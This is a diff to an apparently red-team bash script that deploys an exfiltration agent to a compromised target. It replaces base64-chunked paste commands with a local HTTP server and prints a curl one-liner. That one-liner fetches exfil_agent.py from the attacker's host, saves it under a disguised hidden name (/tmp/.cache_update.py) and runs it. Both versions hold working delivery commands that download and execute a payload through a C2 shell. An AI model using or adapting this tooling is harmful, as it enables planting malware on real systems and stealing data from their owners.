@@ -1,33 +1,37 @@
 #!/bin/bash
 # ============================================
 # Red Team - Deploy Exfil Agent to Target
-# Generates the base64 command to paste into bind shell
+# Starts HTTP server and prints one-liner for C2
 # ============================================
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 AGENT_FILE="${SCRIPT_DIR}/exfil_agent.py"
 ATTACKER_IP="${1:?Usage: ./deploy_agent.sh <ATTACKER_IP>}"
+HTTP_PORT="${2:-8888}"
 
 if [ ! -f "$AGENT_FILE" ]; then
     echo "[X] $AGENT_FILE not found"
     exit 1
 fi
 
-B64=$(gzip -c "$AGENT_FILE" | base64 -w0)
-CHUNK_SIZE=400
-TOTAL_CHARS=${#B64}
-TOTAL_CHUNKS=$(( (TOTAL_CHARS + CHUNK_SIZE - 1) / CHUNK_SIZE ))
+echo "[*] Starting HTTP server on port ${HTTP_PORT}..."
+cd "$SCRIPT_DIR"
+python3 -m http.server "$HTTP_PORT" --bind "$ATTACKER_IP" &>/dev/null &
+HTTP_PID=$!
+sleep 0.5
 
-echo "[*] Deploy commands generated (${TOTAL_CHUNKS} chunks). Paste into C2 one by one:"
+if ! kill -0 "$HTTP_PID" 2>/dev/null; then
+    echo "[X] HTTP server failed to start (port ${HTTP_PORT} in use?)"
+    exit 1
+fi
+
+echo "[+] HTTP server running (PID: ${HTTP_PID})"
 echo ""
-echo "rm -f /tmp/.b64"
-
-for (( i=0; i<TOTAL_CHARS; i+=CHUNK_SIZE )); do
-    CHUNK="${B64:$i:$CHUNK_SIZE}"
-    echo "echo -n '${CHUNK}' >> /tmp/.b64"
-done
-
-echo "base64 -d /tmp/.b64 | gunzip > /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP} && rm -f /tmp/.b64"
+echo "[*] Paste this ONE command into C2:"
 echo ""
-echo "[*] Agent size: $(wc -c < "$AGENT_FILE") bytes"
-echo "[*] Compressed base64: ${TOTAL_CHARS} chars -> ${TOTAL_CHUNKS} chunks"
+echo "curl -s http://${ATTACKER_IP}:${HTTP_PORT}/exfil_agent.py -o /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP}"
+echo ""
+echo "[*] Press Enter after agent connects to stop HTTP server..."
+read -r
+kill "$HTTP_PID" 2>/dev/null
+echo "[*] HTTP server stopped"
